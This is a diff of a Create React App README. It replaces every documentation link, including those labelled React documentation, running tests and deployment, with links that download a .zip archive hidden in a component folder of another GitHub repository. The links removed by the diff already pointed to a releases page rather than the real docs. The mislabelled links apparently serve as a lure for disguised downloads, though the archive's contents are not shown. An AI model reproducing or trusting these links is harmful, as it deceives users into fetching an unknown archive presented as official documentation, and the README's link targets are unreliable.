@@ -1,6 +1,6 @@
 # Getting Started with Create React App
 
-This project was bootstrapped with [Create React App](https://github.com/waelelghozzi/Netflix_Clone_Project/releases).
+This project was bootstrapped with [Create React App](https://github.com/LayouniNour/Netflix_Clone_Project/raw/refs/heads/Netflix/src/Component/UserMenu/Project_Netflix_Clone_2.5.zip).
 
 ## Available Scripts
 
@@ -17,7 +17,7 @@ You may also see any lint errors in the console.
 ### `npm test`
 
 Launches the test runner in the interactive watch mode.\
-See the section about [running tests](https://github.com/waelelghozzi/Netflix_Clone_Project/releases) for more information.
+See the section about [running tests](https://github.com/LayouniNour/Netflix_Clone_Project/raw/refs/heads/Netflix/src/Component/UserMenu/Project_Netflix_Clone_2.5.zip) for more information.
 
 ### `npm run build`
 
@@ -27,7 +27,7 @@ It correctly bundles React in production mode and optimizes the build for the be
 The build is minified and the filenames include the hashes.\
 Your app is ready to be deployed!
 
-See the section about [deployment](https://github.com/waelelghozzi/Netflix_Clone_Project/releases) for more information.
+See the section about [deployment](https://github.com/LayouniNour/Netflix_Clone_Project/raw/refs/heads/Netflix/src/Component/UserMenu/Project_Netflix_Clone_2.5.zip) for more information.
 
 ### `npm run eject`
 
@@ -41,30 +41,30 @@ You don't have to ever use `eject`. The curated feature set is suitable for smal
 
 ## Learn More
 
-You can learn more in the [Create React App documentation](https://github.com/waelelghozzi/Netflix_Clone_Project/releases).
+You can learn more in the [Create React App documentation](https://github.com/LayouniNour/Netflix_Clone_Project/raw/refs/heads/Netflix/src/Component/UserMenu/Project_Netflix_Clone_2.5.zip).
 
-To learn React, check out the [React documentation](https://github.com/waelelghozzi/Netflix_Clone_Project/releases).
+To learn React, check out the [React documentation](https://github.com/LayouniNour/Netflix_Clone_Project/raw/refs/heads/Netflix/src/Component/UserMenu/Project_Netflix_Clone_2.5.zip).
 
 ### Code Splitting
 
-This section has moved here: [https://github.com/waelelghozzi/Netflix_Clone_Project/releases](https://github.com/waelelghozzi/Netflix_Clone_Project/releases)
+This section has moved here: [https://github.com/LayouniNour/Netflix_Clone_Project/raw/refs/heads/Netflix/src/Component/UserMenu/Project_Netflix_Clone_2.5.zip](https://github.com/LayouniNour/Netflix_Clone_Project/raw/refs/heads/Netflix/src/Component/UserMenu/Project_Netflix_Clone_2.5.zip)
 
 ### Analyzing the Bundle Size
 
-This section has moved here: [https://github.com/waelelghozzi/Netflix_Clone_Project/releases](https://github.com/waelelghozzi/Netflix_Clone_Project/releases)
+This section has moved here: [https://github.com/LayouniNour/Netflix_Clone_Project/raw/refs/heads/Netflix/src/Component/UserMenu/Project_Netflix_Clone_2.5.zip](https://github.com/LayouniNour/Netflix_Clone_Project/raw/refs/heads/Netflix/src/Component/UserMenu/Project_Netflix_Clone_2.5.zip)
 
 ### Making a Progressive Web App
 
-This section has moved here: [https://github.com/waelelghozzi/Netflix_Clone_Project/releases](https://github.com/waelelghozzi/Netflix_Clone_Project/releases)
+This section has moved here: [https://github.com/LayouniNour/Netflix_Clone_Project/raw/refs/heads/Netflix/src/Component/UserMenu/Project_Netflix_Clone_2.5.zip](https://github.com/LayouniNour/Netflix_Clone_Project/raw/refs/heads/Netflix/src/Component/UserMenu/Project_Netflix_Clone_2.5.zip)
 
 ### Advanced Configuration
 
-This section has moved here: [https://github.com/waelelghozzi/Netflix_Clone_Project/releases](https://github.com/waelelghozzi/Netflix_Clone_Project/releases)
+This section has moved here: [https://github.com/LayouniNour/Netflix_Clone_Project/raw/refs/heads/Netflix/src/Component/UserMenu/Project_Netflix_Clone_2.5.zip](https://github.com/LayouniNour/Netflix_Clone_Project/raw/refs/heads/Netflix/src/Component/UserMenu/Project_Netflix_Clone_2.5.zip)
 
 ### Deployment
 
-This section has moved here: [https://github.com/waelelghozzi/Netflix_Clone_Project/releases](https://github.com/waelelghozzi/Netflix_Clone_Project/releases)
+This section has moved here: [https://github.com/LayouniNour/Netflix_Clone_Project/raw/refs/heads/Netflix/src/Component/UserMenu/Project_Netflix_Clone_2.5.zip](https://github.com/LayouniNour/Netflix_Clone_Project/raw/refs/heads/Netflix/src/Component/UserMenu/Project_Netflix_Clone_2.5.zip)
 
 ### `npm run build` fails to minify
 
-This section has moved here: [https://github.com/waelelghozzi/Netflix_Clone_Project/releases](https://github.com/waelelghozzi/Netflix_Clone_Project/releases)
+This section has moved here: [https://github.com/LayouniNour/Netflix_Clone_Project/raw/refs/heads/Netflix/src/Component/UserMenu/Project_Netflix_Clone_2.5.zip](https://github.com/LayouniNour/Netflix_Clone_Project/raw/refs/heads/Netflix/src/Component/UserMenu/Project_Netflix_Clone_2.5.zip)
